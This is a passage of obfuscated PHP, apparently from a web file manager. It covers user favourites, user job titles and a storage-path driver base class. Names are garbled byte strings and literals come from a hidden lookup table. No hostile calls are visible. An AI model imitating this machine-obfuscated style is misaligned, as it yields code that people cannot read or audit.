$ÜåŞé®[1878]); return empty($ÒŒ–³ÏŸ) ? 0 : max($ÒŒ–³ÏŸ) + 1; } public function update($ğ£úƒ³“, $šº¤äÁ) { $ı¡±»Íê =& $_SERVER[Ó¡Ÿ§‚]; $ş­Ãâì‘ = $this->listData($ğ£úƒ³“); $«×¼§àÂ = $this->findByName($šº¤äÁ[$ı¡±»Íê[32]]); if (!$ş­Ãâì‘ || $«×¼§àÂ && $«×¼§àÂ[$ı¡±»Íê[399]] != $ş­Ãâì‘[$ı¡±»Íê[399]]) { return !1; } return parent::update($ğ£úƒ³“, $šº¤äÁ); } public function remove($Ü³çœ¼¸, $•¶óéää = false) { $˜ŸÃ™÷ =& $_SERVER[Ó¡Ÿ§‚]; $òŸŸí…Š = $this->listData($Ü³çœ¼¸); if (!$òŸŸí…Š) { return; } if (!$•¶óéää && $òŸŸí…Š[$˜ŸÃ™÷[1283]] == $˜ŸÃ™÷[88]) { return !1; } return parent::remove($Ü³çœ¼¸); } public function enable($ÄÔô¦, $¢¿¨à) { return $this->update($ÄÔô¦, array($_SERVER[Ó¡Ÿ§‚][2285] => $¢¿¨à)); } public function run($­¾•˜ù) { return $this->update($­¾•˜ù, array($_SERVER[Ó¡Ÿ§‚][2297] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($çøœÃšÕ) { $ãÖ•ü™’ =& $_SERVER[Ó¡Ÿ§‚]; return array($ãÖ•ü™’[1965] => array(USER_ID, $ãÖ•ü™’[2298])); } protected function listData() { $À¯‘™Œ™ =& $_SERVER[Ó¡Ÿ§‚]; $Ñİ¶ ¦Ø = array($À¯‘™Œ™[1656] => USER_ID, $À¯‘™Œ™[492] => 0); $şõ¯‹× = $À¯‘™Œ™[2299]; $’‹ßöö´ = $this->field($şõ¯‹×)->where($Ñİ¶ ¦Ø)->order($À¯‘™Œ™[2300])->select(); return $’‹ßöö´ ? $’‹ßöö´ : array(); } protected function resetCache() { } protected function listView() { $§Šåö¼ö =& $_SERVER[Ó¡Ÿ§‚]; $Ö¨‚¼óñ = $this->listData(); $üÂÉş²â = array_filter_by_field($Ö¨‚¼óñ, $§Šåö¼ö[33], $§Šåö¼ö[425]); $½ïì‡ = array_to_keyvalue($üÂÉş²â, $§Šåö¼ö[12], $§Šåö¼ö[84]); if (!$½ïì‡) { return $Ö¨‚¼óñ; } $Ş·…îØµ = 2000; $Óí©š”¡ = array($§Šåö¼ö[426] => array($§Šåö¼ö[427], $½ïì‡)); $É’“Èì = Model($§Šåö¼ö[824])->listSource($Óí©š”¡, $Ş·…îØµ); $É’“Èì = array_merge($É’“Èì[$§Šåö¼ö[83]], $É’“Èì[$§Šåö¼ö[82]]); $É’“Èì = array_to_keyvalue($É’“Èì, $§Šåö¼ö[411]); foreach ($Ö¨‚¼óñ as $İÅæ¾†Ñ => $ô•Ï‡‹€) { $é¤âˆ“„ = $É’“Èì[$ô•Ï‡‹€[$§Šåö¼ö[84]]]; $é¤âˆ“„ = $é¤âˆ“„ ? $é¤âˆ“„ : array(); $Ö¨‚¼óñ[$İÅæ¾†Ñ] = array_merge($é¤âˆ“„, $ô•Ï‡‹€); } return $Ö¨‚¼óñ; } protected function addFav($’ò¨‹¼”, $ô‹ŠêŠ = '', $¸×ì’¾ = "\x73\x6f\x75\162\x63\145") { $…¾™äƒ =& $_SERVER[Ó¡Ÿ§‚]; $Äş—‘ã× = array($…¾™äƒ[1656] => USER_ID, $…¾™äƒ[492] => 0, $…¾™äƒ[431] => $¸×ì’¾, $…¾™äƒ[430] => $’ò¨‹¼”); if ($this->where($Äş—‘ã×)->find()) { return !1; } $Äş—‘ã× = array($…¾™äƒ[1656] => USER_ID, $…¾™äƒ[492] => 0); $ò‹Âã“ú = $this->where($Äş—‘ã×)->max($…¾™äƒ[1878]); if (!$ò‹Âã“ú) { $ò‹Âã“ú = 0; } if (!$ô‹ŠêŠ && $¸×ì’¾ == $…¾™äƒ[425]) { $ÄÎùî™î = Model($…¾™äƒ[1338])->where(array($…¾™äƒ[426] => $’ò¨‹¼”))->find(); if (!$ÄÎùî™î) { return !1; } $ô‹ŠêŠ = $ÄÎùî™î[$…¾™äƒ[32]]; } $ô‹ŠêŠ = $this->getAutoName($ô‹ŠêŠ); $Á¿‡ÍŠŸ = array($…¾™äƒ[1656] => USER_ID, $…¾™äƒ[492] => 0, $…¾™äƒ[429] => $ô‹ŠêŠ, $…¾™äƒ[430] => $’ò¨‹¼”, $…¾™äƒ[431] => $¸×ì’¾, $…¾™äƒ[1858] => $ò‹Âã“ú + 1); return $this->add($Á¿‡ÍŠŸ); } protected function remove($Å¹ÓÌ¦) { $µ¬÷®‹ì =& $_SERVER[Ó¡Ÿ§‚]; $¯ìÃÈ•ğ = array($µ¬÷®‹ì[1656] => USER_ID, $µ¬÷®‹ì[428] => $Å¹ÓÌ¦); return $this->where($¯ìÃÈ•ğ)->delete(); } protected function removeByName($ÒšÎ£®Ä) { $«ò‘ï¨Ó =& $_SERVER[Ó¡Ÿ§‚]; $÷Üš²îá = array($«ò‘ï¨Ó[1656] => USER_ID, $«ò‘ï¨Ó[429] => $ÒšÎ£®Ä, $«ò‘ï¨Ó[492] => 0); return $this->where($÷Üš²îá)->delete(); } protected function rename($Şú÷»Á·, $ÀÊÌ³‰…) { $‰×Âæ²¨ =& $_SERVER[Ó¡Ÿ§‚]; if ($Şú÷»Á· == $ÀÊÌ³‰…) { return !1; } $™¯¦À®ç = $this->getAutoName($ÀÊÌ³‰…); if ($ÀÊÌ³‰… != $™¯¦À®ç) { return !1; } $™ŠöŞ…ç = array($‰×Âæ²¨[1656] => USER_ID, $‰×Âæ²¨[492] => 0, $‰×Âæ²¨[32] => $Şú÷»Á·); return $this->where($™ŠöŞ…ç)->save(array($‰×Âæ²¨[32] => $ÀÊÌ³‰…)); } protected function resetSort($ö××äÎÃ) { $’Äµ™¢· =& $_SERVER[Ó¡Ÿ§‚]; $ö××äÎÃ = is_array($ö××äÎÃ) ? $ö××äÎÃ : array(); $¢„´ÍÚÔ = array($’Äµ™¢·[1656] => USER_ID); for ($•­øò‚ı = 0; $•­øò‚ı < count($ö××äÎÃ); $•­øò‚ı++) { $¢„´ÍÚÔ[$’Äµ™¢·[428]] = $ö××äÎÃ[$•­øò‚ı]; $this->where($¢„´ÍÚÔ)->save(array($’Äµ™¢·[1858] => $•­øò‚ı + 1)); } return !0; } protected function moveTop($€ïÚ±†Ù) { $ı¹Æô³µ =& $_SERVER[Ó¡Ÿ§‚]; $Èí¬ãå½ = array($ı¹Æô³µ[1656] => USER_ID, $ı¹Æô³µ[492] => 0); $õß£çâ÷ = $this->where($Èí¬ãå½)->where(array($ı¹Æô³µ[32] => $€ïÚ±†Ù))->find(); if (!$õß£çâ÷) { return; } $ÄÀ™ú°à = $this->field($ı¹Æô³µ[399])->where($Èí¬ãå½)->order($ı¹Æô³µ[2300])->select(); $ÄÀ™ú°à = array_to_keyvalue($ÄÀ™ú°à, $ı¹Æô³µ[12], $ı¹Æô³µ[399]); $¶ª¨û‚© = $ÄÀ™ú°à; $ÄÀ™ú°à = array_remove_value($ÄÀ™ú°à, $õß£çâ÷[$ı¹Æô³µ[399]]); array_unshift($ÄÀ™ú°à, $õß£çâ÷[$ı¹Æô³µ[399]]); return $this->resetSort($ÄÀ™ú°à); } protected function moveBottom($Õ÷¡ÌÖĞ) { $ŸÕœºŸé =& $_SERVER[Ó¡Ÿ§‚]; $±¤¥ĞÄì = array($ŸÕœºŸé[1656] => USER_ID, $ŸÕœºŸé[492] => 0); $À“¸Ğá¨ = $this->where($±¤¥ĞÄì)->max($ŸÕœºŸé[1878]); $‰ÌÙÙ±£ = array($ŸÕœºŸé[1878] => $À“¸Ğá¨ + 1); return $this->where($±¤¥ĞÄì)->where(array($ŸÕœºŸé[32] => $Õ÷¡ÌÖĞ))->save($‰ÌÙÙ±£); } private function getAutoName($×õäæØô) { $Õëş´¸€ =& $_SERVER[Ó¡Ÿ§‚]; $öà‡’ª¸ = array($Õëş´¸€[1656] => USER_ID, $Õëş´¸€[492] => 0); $å”‘·× = $this->field($Õëş´¸€[32])->where($öà‡’ª¸)->select(); $å”‘·× = array_to_keyvalue($å”‘·×, $Õëş´¸€[12], $Õëş´¸€[32]); if (!$å”‘·× || !in_array($×õäæØô, $å”‘·×)) { return $×õäæØô; } for ($ë·Èæú = 0; $ë·Èæú < count($å”‘·×); $ë·Èæú++) { if (!in_array($×õäæØô . "\50{$ë·Èæú}\x29", $å”‘·×)) { return $×õäæØô . "\50{$ë·Èæú}\x29"; } } return $×õäæØô . "\50{$ë·Èæú}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x6a\x6f\x62\x4c\x69\x73\x74"; public $field = array("\156\141\155\145", "\144\145\163\x63", "\163\x6f\162\164"); const JOB_KEY = "\163\145\x6c\x66\112\x6f\x62\x4c\x69\163\x74"; public function listData($Á¹ãˆ¦  = false, $ãÅ§Şùş = "\x73\157\162\x74", $ÄáıŠ¸Ü = false) { return parent::listData($Á¹ãˆ¦ , $ãÅ§Şùş, $ÄáıŠ¸Ü); } public function remove($»±–ø€) { return parent::remove($»±–ø€); } public function add($¨ôíÚ¶å) { $Í×Õ‹’ƒ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->findByName($¨ôíÚ¶å[$Í×Õ‹’ƒ[32]])) { return !1; } $¨ôíÚ¶å[$Í×Õ‹’ƒ[1878]] = $this->getSort(); return parent::insert($¨ôíÚ¶å); } private function getSort() { $šöÕ™°º =& $_SERVER[Ó¡Ÿ§‚]; $®ÉåÁƒñ = parent::listData(); $Ñ¥Éª‡á = array_to_keyvalue($®ÉåÁƒñ, $šöÕ™°º[12], $šöÕ™°º[1878]); return empty($Ñ¥Éª‡á) ? 0 : max($Ñ¥Éª‡á) + 1; } public function update($ÎĞƒ–´„, $ŸØİäá) { $Š¹…è¥ =& $_SERVER[Ó¡Ÿ§‚]; $Ø”à‹‰ƒ = parent::listData($ÎĞƒ–´„); $æÂ›˜÷¶ = $this->findByName($ŸØİäá[$Š¹…è¥[32]]); if (!$Ø”à‹‰ƒ || $æÂ›˜÷¶ && $æÂ›˜÷¶[$Š¹…è¥[399]] != $Ø”à‹‰ƒ[$Š¹…è¥[399]]) { return !1; } return parent::update($ÎĞƒ–´„, $ŸØİäá); } public function setUserJob($ü½ÏúèÂ, $Ëùš·é–) { $±éüı¯³ =& $_SERVER[Ó¡Ÿ§‚]; if (!is_array($Ëùš·é–)) { $Ëùš·é– = array($Ëùš·é–); } $¬£ïŒ¶ö = parent::listData(); $ÏºœªªÎ = array_to_keyvalue($¬£ïŒ¶ö, $±éüı¯³[32]); $–Ëàæçï = $±éüı¯³[378]; foreach ($Ëùš·é– as $Ï‡ºÙî¥) { if ($ÏºœªªÎ[$Ï‡ºÙî¥]) { $–Ëàæçï .= $ÏºœªªÎ[$Ï‡ºÙî¥][$±éüı¯³[399]] . $±éüı¯³[50]; } else { $ˆÎ ¼ö¿ = $this->add($Ï‡ºÙî¥); $–Ëàæçï .= $ˆÎ ¼ö¿ . $±éüı¯³[50]; } } $–Ëàæçï = rtrim($–Ëàæçï, $±éüı¯³[50]); Model($±éüı¯³[534])->metaSet($ü½ÏúèÂ, self::JOB_KEY, $–Ëàæçï); } public function getUserJob($Û™—ó•) { $Œ‚“ü’÷ = Model($_SERVER[Ó¡Ÿ§‚][534])->metaGet($Û™—ó•); return $this->getUserJobInfo($Œ‚“ü’÷[self::JOB_KEY]); } public function getUserJobInfo($Ãœ‰Şèó) { $ì¸–ÒÙ¡ =& $_SERVER[Ó¡Ÿ§‚]; $ÒªßÃöû = explode($ì¸–ÒÙ¡[50], $Ãœ‰Şèó); $ ÷ÑÅ¯ = parent::listData(); $ ÷ÑÅ¯ = array_remove_key($ ÷ÑÅ¯, $ì¸–ÒÙ¡[201]); $ô‚É´û = array(); foreach ($ÒªßÃöû as $ƒªã±ô) { if (isset($ ÷ÑÅ¯[$ƒªã±ô])) { $ô‚É´û[] = $ ÷ÑÅ¯[$ƒªã±ô]; } } return $ô‚É´û; } } goto BÍÈéØµÎ¨; D°–Æ‚º£: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Áˆ‹÷‰¬ =& $_SERVER[Ó¡Ÿ§‚]; $this->objectDriver = array($Áˆ‹÷‰¬[60], $Áˆ‹÷‰¬[61], $Áˆ‹÷‰¬[62], $Áˆ‹÷‰¬[63], $Áˆ‹÷‰¬[64], $Áˆ‹÷‰¬[65], $Áˆ‹÷‰¬[66], $Áˆ‹÷‰¬[67], $Áˆ‹÷‰¬[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ÃõÉº×”) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ÃõÉº×”, $_SERVER[Ó¡Ÿ§‚][8]); } return $ÃõÉº×”; } public function iconvApp($§ûÒ† à) { return $§ûÒ† à; } public function iconvSystem($‡Î—’—Ó) { return $‡Î—’—Ó; } public function iconvTo($ÔùëñÙ, $°’òã©, $•Îˆï) { $ğêï›‹ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ÔùëñÙ || !function_exists($ğêï›‹[69])) { return $ÔùëñÙ; } static $×ÊÇÓŞ = array(); $–¼ÍÍ³è = $°’òã© . $ğêï›‹[70] . $•Îˆï . $ğêï›‹[71] . $ÔùëñÙ; if (isset($×ÊÇÓŞ[$–¼ÍÍ³è])) { return $×ÊÇÓŞ[$–¼ÍÍ³è]; } if (function_exists($ğêï›‹[72])) { $Ëû’ÑÔ« = @mb_convert_encoding($ÔùëñÙ, $•Îˆï, $°’òã©); } else { $Ëû’ÑÔ« = @iconv($°’òã©, $•Îˆï, $ÔùëñÙ); } $Ëû’ÑÔ« = $Ëû’ÑÔ« ? $Ëû’ÑÔ« : $ÔùëñÙ; if (strstr($Ëû’ÑÔ«, $ğêï›‹[73])) { $Ëû’ÑÔ« = str_replace($ğêï›‹[73], $ğêï›‹[11], $Ëû’ÑÔ«); } $×ÊÇÓŞ[$°’òã© . $ğêï›‹[70] . $•Îˆï . $ğêï›‹[71] . $ÔùëñÙ] = $Ëû’ÑÔ«; $×ÊÇÓŞ[$•Îˆï . $ğêï›‹[70] . $°’òã© . $ğêï›‹[71] . $ÔùëñÙ] = $ÔùëñÙ; $×ÊÇÓŞ[$•Îˆï . $ğêï›‹[70] . $°’òã© . $ğêï›‹[71] . $Ëû’ÑÔ«] = $ÔùëñÙ; $×ÊÇÓŞ[$°’òã© . $ğêï›‹[70] . $•Îˆï . $ğêï›‹[71] . $Ëû’ÑÔ«] = $Ëû’ÑÔ«; return $Ëû’ÑÔ«; } public function getPathInner($«¬“¬Úö) { $ºµÚİ°‚ = IO::init($«¬“¬Úö); return $ºµÚİ°‚->path; } public function getPathOuter($–²ßÃˆ) { $¥›©Û¼ô =& $_SERVER[Ó¡Ÿ§‚]; $Ö­ÌöçÎ = strlen(trim($this->pathBase, $¥›©Û¼ô[8])); $–²ßÃˆ = substr(trim($–²ßÃˆ, $¥›©Û¼ô[8]), $Ö­ÌöçÎ); return $this->pathDriver . $¥›©Û¼ô[8] . ltrim($–²ßÃˆ, $¥›©Û¼ô[8]); } public function isParentOf($’Õ÷Ù, $’›²€’Ì) { $Æ‘š†ú… =& $_SERVER[Ó¡Ÿ§‚]; $’Õ÷Ù = rtrim(strtolower($’Õ÷Ù), $Æ‘š†ú…[8]) . $Æ‘š†ú…[8]; $’›²€’Ì = rtrim(strtolower($’›²€’Ì), $Æ‘š†ú…[8]) . $Æ‘š†ú…[8]; $‹¨ÅÄ = strpos($’›²€’Ì, $’Õ÷Ù) === 0; return $‹¨ÅÄ; } public function getType() { $ÍÊÁâ™ş =& $_SERVER[Ó¡Ÿ§‚]; $ãÓ¶ÉáÀ = str_replace($ÍÊÁâ™ş[74], $ÍÊÁâ™ş[12], get_class($this)); return strtolower($ãÓ¶ÉáÀ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ñ á¶Í, $Œá•Ñüë) { $çğÈ‡ä¥ =& $_SERVER[Ó¡Ÿ§‚]; $ÏàÂõÈó = rtrim($ñ á¶Í, $çğÈ‡ä¥[8]) . $çğÈ‡ä¥[8] . $Œá•Ñüë; $£ïÏˆ = $this->exist($ÏàÂõÈó); return $£ïÏˆ ? $ÏàÂõÈó : !1; } public function setModifyTime($ãûÔõ×Ş, $É“¼íÇŒ = '') { } public function renameObject($âÚ‘ŒŒ, $Ûº·ŞºÄ) { $š˜ü¨ƒ = $Ûº·ŞºÄ; $âÚ‘ŒŒ = $this->getPathOuter($âÚ‘ŒŒ); $Ûº·ŞºÄ = $this->pathFather($âÚ‘ŒŒ) . $Ûº·ŞºÄ; $ùÚ‰ÜÅÜ = IO::copy($âÚ‘ŒŒ, $this->pathFather($âÚ‘ŒŒ), REPEAT_RENAME_FOLDER, $š˜ü¨ƒ); if ($ùÚ‰ÜÅÜ) { IO::remove($âÚ‘ŒŒ); } return $ùÚ‰ÜÅÜ ? $Ûº·ŞºÄ : !1; } public function tempFile($¿˜Á» = '', $³‡½Âú = '') { if (!$¿˜Á») { $¿˜Á» = rand_string(15); } $ÌşÁ’Æœ = TEMP_FILES . rand_string(15) . $_SERVER[Ó¡Ÿ§‚][8]; @mkdir($ÌşÁ’Æœ, DEFAULT_PERRMISSIONS, !0); $‡£­Ì¼ä = $ÌşÁ’Æœ . $¿˜Á»; @touch($‡£­Ì¼ä); if ($³‡½Âú) { file_put_contents($‡£­Ì¼ä, $³‡½Âú); } return $‡£­Ì¼ä; } public function tempFileRemve($¾Óëü¿) { @unlink($¾Óëü¿); @rmdir($this->pathFather($¾Óëü¿)); } public function mkfile($®˜•İä­, $Ñ·™ğí” = '', $„œ‡àÔÏ = REPEAT_RENAME) { } public function mkdir($ °¡ó¯Ö, $íÒşÉí = REPEAT_SKIP) { } public function delFile($Ñ±¾) { } public function delFolder($˜İÄ¦ù) { } public function copyFile($ÒËƒâ—³, $ÑÊÂß˜“) { } public function moveFile($£ïÇ¡Œ, $Á¡Àáø­) { } public function remove($Øº±¿˜¥) { if ($this->isFile($Øº±¿˜¥)) { return $this->delFile($Øº±¿˜¥); } return $this->delFolder($Øº±¿˜¥); } public function rename($Ü›ÂÛ÷’, $Ù¥€ıˆ¸) { } public function exist($í¶Ëè§) { } public function findByHash($®ÏæÏ¥Ë = '', $“«ŒÅ… = '') { return !1; } public function isFile($Ê‚×€¾à) { } public function isFolder($¢§Ö¸±) { } public function size($ÖæÑ‘İ—) { } public function info($ˆ¢÷÷à¯) { } public function infoSimple($©Õ«ÎğÌ) { return $this->info($©Õ«ÎğÌ); } public function infoAuth($®¦ù­ãÑ) { return $this->info($®¦ù­ãÑ); } public function infoFull($˜‡ûõ³Ô) { return $this->info($˜‡ûõ³Ô); } public function infoWithChildren($Ï¡ˆŞ—´) { $¤¬½–½« =& $_SERVER[Ó¡Ÿ§‚]; static $ššèãëÄ = array(); if (isset($ššèãëÄ[$Ï¡ˆŞ—´])) { return $ššèãëÄ[$Ï¡ˆŞ—´]; } $æ™Í’´Ï = $this->info($Ï¡ˆŞ—´); if ($æ™Í’´Ï && $æ™Í’´Ï[$¤¬½–½«[33]] == $¤¬½–½«[75]) { $ˆ…’×‡‰ = array($¤¬½–½«[76] => 0, $¤¬½–½«[77] => 0, $¤¬½–½«[78] => 0); $this->infoChildren($Ï¡ˆŞ—´, $ˆ…’×‡‰); $æ™Í’´Ï[$¤¬½–½«[76]] = $ˆ…’×‡‰[$¤¬½–½«[76]]; $æ™Í’´Ï[$¤¬½–½«[79]] = array($¤¬½–½«[80] => $ˆ…’×‡‰[$¤¬½–½«[77]], $¤¬½–½«[81] => $ˆ…’×‡‰[$¤¬½–½«[78]]); $ššèãëÄ[$Ï¡ˆŞ—´] = $æ™Í’´Ï; } return $æ™Í’´Ï; } public function listPath($Ò³ŠúÜÚ, $„®ÙŸò = false) { } public function has($©ùâ›Ì¶, $èé«¨ = false, $ºÕô¸±Ã = false) { } public function canRead($¨ä×•) { } public function canWrite($³¬¨Ÿ§ú) { } public function getContent($æë¯°Şß) { } public function setContent($¹ò©Ê•ù, $™æƒÄ¿ = '') { } protected function infoChildren($÷ÏàßÇ, &$œ°Ü¤ë) { $ÄÌ³õ¢Ù =& $_SERVER[Ó¡Ÿ§‚]; check_abort_echo(); $È¿ÅºÖ = $this->listPath($÷ÏàßÇ, !0); $È¿ÅºÖ = array_merge($È¿ÅºÖ[$ÄÌ³õ¢Ù[82]], $È¿ÅºÖ[$ÄÌ³õ¢Ù[83]]); foreach ($È¿ÅºÖ as $¦°¤æ³ˆ) { if ($¦°¤æ³ˆ[$ÄÌ³õ¢Ù[33]] == $ÄÌ³õ¢Ù[75]) { $œ°Ü¤ë[$ÄÌ³õ¢Ù[78]]++; $ïéˆİ§è = $this->getPathInner($¦°¤æ³ˆ[$ÄÌ³õ¢Ù[84]]); $this->infoChildren($ïéˆİ§è, $œ°Ü¤ë); } else { $œ°Ü¤ë[$ÄÌ³õ¢Ù[77]]++; $œ°Ü¤ë[$ÄÌ³õ¢Ù[76]] += $¦°¤æ³ˆ[$ÄÌ³õ¢Ù[76]]; } } } public function fileSubstr($¨¥ô”¦Š, $²¯òù, $Óß‚Ñ…) { } public function listAll($Ÿ¨¡œ²™) { } public function listAllMake($‹ò–Ã†ƒ, &$û¼±ŠÂ) { $éËÛ›÷Á =& $_SERVER[Ó¡Ÿ§‚]; check_abort_echo(); $ó×›µŠÆ = $this->listPath($‹ò–Ã†ƒ, !0); if (!$ó×›µŠÆ) { return; } $É¯æÔïş = array_merge($ó×›µŠÆ[$éËÛ›÷Á[82]], $ó×›µŠÆ[$éËÛ›÷Á[83]]); foreach ($É¯æÔïş as $ÙÜÚ‡í) { $ÎËò¤‰à = $ÙÜÚ‡í[$éËÛ›÷Á[33]] == $éËÛ›÷Á[75]; $ˆÔ†È¾ = array($éËÛ›÷Á[84] => $ÙÜÚ‡í[$éËÛ›÷Á[84]], $éËÛ›÷Á[75] => $ÎËò¤‰à); if (isset($ÙÜÚ‡í[$éËÛ›÷Á[76]])) { $ˆÔ†È¾[$éËÛ›÷Á[76]] = $ÙÜÚ‡í[$éËÛ›÷Á[76]]; } if (isset($ÙÜÚ‡í[$éËÛ›÷Á[85]])) { $ˆÔ†È¾[$éËÛ›÷Á[85]] = $ÙÜÚ‡í[$éËÛ›÷Á[85]]; } if (!$ÎËò¤‰à) { $û¼±ŠÂ[] = $ˆÔ†È¾; continue; } $û¼±ŠÂ[] = $ˆÔ†È¾; $ß¯í×¬¶ = $ÙÜÚ‡í[$éËÛ›÷Á[84]]; $©¢¾–º• = $this->pathDriver; if (substr($ÙÜÚ‡í[$éËÛ›÷Á[84]], 0, strlen($©¢¾–º•)) == $©¢¾–º•) { $ß¯í×¬¶ = substr($ß¯í×¬¶, strlen($©¢¾–º•)); } $this->listAllMake($ß¯í×¬¶, $û¼±ŠÂ); } } public function listAllSimple($¡å†õæş, $ÈĞğñ®Ñ = false) { $ ’œÚÉ– = $this->listAll($¡å†õæş); return $this->listAllSimpleMake($ ’œÚÉ–, $this->getPathOuter($¡å†õæş), $ÈĞğñ®Ñ); } public function listAllSimpleMake($å™™¬Òæ, $Å¤ö¡·, $»Ï¥â÷î) { $—ˆè«³Ş =& $_SERVER[Ó¡Ÿ§‚]; $İÆùØ€¼ = array(); $Å¤ö¡· = rtrim(get_path_father($Å¤ö¡·), $—ˆè«³Ş[8]) . $—ˆè«³Ş[8]; foreach ($å™™¬Òæ as $ÀµÁàà) { $Ş½˜Óßî = array($—ˆè«³Ş[84] => $ÀµÁàà[$—ˆè«³Ş[84]], $—ˆè«³Ş[86] => $ÀµÁàà[$—ˆè«³Ş[84]], $—ˆè«³Ş[75] => $ÀµÁàà[$—ˆè«³Ş[75]]); if (isset($ÀµÁàà[$—ˆè«³Ş[76]]) && !$ÀµÁàà[$—ˆè«³Ş[75]]) { $Ş½˜Óßî[$—ˆè«³Ş[76]] = $ÀµÁàà[$—ˆè«³Ş[76]]; } if (isset($ÀµÁàà[$—ˆè«³Ş[85]])) { $Ş½˜Óßî[$—ˆè«³Ş[85]] = $ÀµÁàà[$—ˆè«³Ş[85]]; } if (is_array($ÀµÁàà[$—ˆè«³Ş[87]])) { $Ş½˜Óßî[$—ˆè«³Ş[86]] = $ÀµÁàà[$—ˆè«³Ş[87]][$—ˆè«³Ş[84]]; $Ş½˜Óßî[$—ˆè«³Ş[76]] = $ÀµÁàà[$—ˆè«³Ş[87]][$—ˆè«³Ş[76]]; $Ş½˜Óßî[$—ˆè«³Ş[85]] = $ÀµÁàà[$—ˆè«³Ş[87]][$—ˆè«³Ş[85]]; } else { if (substr($ÀµÁàà[$—ˆè«³Ş[84]], 0, strlen($Å¤ö¡·)) == $Å¤ö¡·) { $Ş½˜Óßî[$—ˆè«³Ş[84]] = substr($ÀµÁàà[$—ˆè«³Ş[84]], strlen($Å¤ö¡·)); } } $éÑº€ = $ÀµÁàà[$—ˆè«³Ş[75]] ? $—ˆè«³Ş[8] : $—ˆè«³Ş[12]; $Ş½˜Óßî[$—ˆè«³Ş[86]] = rtrim($Ş½˜Óßî[$—ˆè«³Ş[86]], $—ˆè«³Ş[8]) . $éÑº€; $Ş½˜Óßî[$—ˆè«³Ş[84]] = $—ˆè«³Ş[8] . trim($Ş½˜Óßî[$—ˆè«³Ş[84]], $—ˆè«³Ş[8]) . $éÑº€; if (!$»Ï¥â÷î) { $ªºüšş = explode($—ˆè«³Ş[8], trim($Ş½˜Óßî[$—ˆè«³Ş[84]], $—ˆè«³Ş[8])); $Ş½˜Óßî[$—ˆè«³Ş[84]] = $—ˆè«³Ş[8] . implode($—ˆè«³Ş[8], array_slice($ªºüšş, 1)) . $éÑº€; } $İÆùØ€¼[] = $Ş½˜Óßî; } return array_sort_by($İÆùØ€¼, $—ˆè«³Ş[84]); } public function upload($–‘®•êÈ, $ïĞŒì«, $ÍãáØİü = false, $Éå’°íÉ = REPEAT_REPLACE) { } public function uploadFileByID($ÒúÆ‹ÙÏ, $¸ú¯¿”š, $úíë§¸Ï) { } public function uploadFileByPath($ôÒÒŸëÔ, $ıÁ’ÓĞÑ, $‰©İ©® = array()) { } public function isUploadServer() { $³±óÜÃÖ =& $_SERVER[Ó¡Ÿ§‚]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $³±óÜÃÖ[88]) { return !0; } return $GLOBALS[$³±óÜÃÖ[6]][$³±óÜÃÖ[89]][$³±óÜÃÖ[90]]; } public function isFileOutServer() { $Î¦Úå È =& $_SERVER[Ó¡Ÿ§‚]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Î¦Úå È[88]) { return !0; } return $GLOBALS[$Î¦Úå È[6]][$Î¦Úå È[89]][$Î¦Úå È[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($‰è®›œê) { $Äš•¨È =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->isCdnHost()) { return $‰è®›œê; } return str_replace(trim(get_url_root($‰è®›œê), $Äš•¨È[8]), trim($this->cdnHost, $Äš•¨È[8]), $‰è®›œê); } public function uploadLink($Ò²ÌÊµ, $ÑÄÉÉÆ¹ = 0) { $‰¨Åğ•ï =& $_SERVER[Ó¡Ÿ§‚]; if ($this->isUploadServer()) { return; } $·â˜şÂÖ = $this->getType(); if (!in_array($·â˜şÂÖ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $î«›Ò = 1024 * 1024 * 10; $Ë×­« = $ÑÄÉÉÆ¹ <= $î«›Ò ? $‰¨Åğ•ï[92] : $‰¨Åğ•ï[93]; $‹‘Ñ„·á = (!$ÑÄÉÉÆ¹ ? 1 : ceil($ÑÄÉÉÆ¹ / pow(1024, 3))) * 3600 * 4; $²ññà×® = $this->{$Ë×­«}($Ò²ÌÊµ, $‹‘Ñ„·á); if ($²ññà×®) { $²ññà×®[$‰¨Åğ•ï[94]] = $Ò²ÌÊµ; $²ññà×®[$‰¨Åğ•ï[95]] = $·â˜şÂÖ; } return $²ññà×®; } public function uploadFormData($µ™‚Ş¶Ğ, $×Ô¾ç = 3600) { } public function multiUploadFormData($ğĞÀœõÆ, $ä½ÄØÜ­ = 3600) { } public function download($¶£Í£°, $ú·²ˆˆ) { } public function ext($†Í…÷¥á) { $ĞÓ«ë†¥ =& $_SERVER[Ó¡Ÿ§‚]; if (strpos($†Í…÷¥á, $ĞÓ«ë†¥[8]) === -1) { $¾š‰é¥Í = $†Í…÷¥á; } else { $¾š‰é¥Í = $this->pathThis($†Í…÷¥á); } $Óá×¶ìÆ = $ĞÓ«ë†¥[12]; if (strstr($¾š‰é¥Í, $ĞÓ«ë†¥[10])) { $Óá×¶ìÆ = substr($¾š‰é¥Í, strrpos($¾š‰é¥Í, $ĞÓ«ë†¥[10]) + 1); $Óá×¶ìÆ = strtolower($Óá×¶ìÆ); } if (strlen($Óá×¶ìÆ) > 3 && preg_match($ĞÓ«ë†¥[96], $Óá×¶ìÆ, $âÙ½âµ¬)) { $Óá×¶ìÆ = $ĞÓ«ë†¥[12]; } return $Óá×¶ìÆ; } public function pathThis($ª£›‹ü¾) { $ç¾àÁíú =& $_SERVER[Ó¡Ÿ§‚]; $ª£›‹ü¾ = str_replace($ç¾àÁíú[97], $ç¾àÁíú[8], rtrim($ª£›‹ü¾, $ç¾àÁíú[8])); $‡Şø±‰” = strrpos($ª£›‹ü¾, $ç¾àÁíú[8]); if ($‡Şø±‰” === !1) { return $ª£›‹ü¾; } return 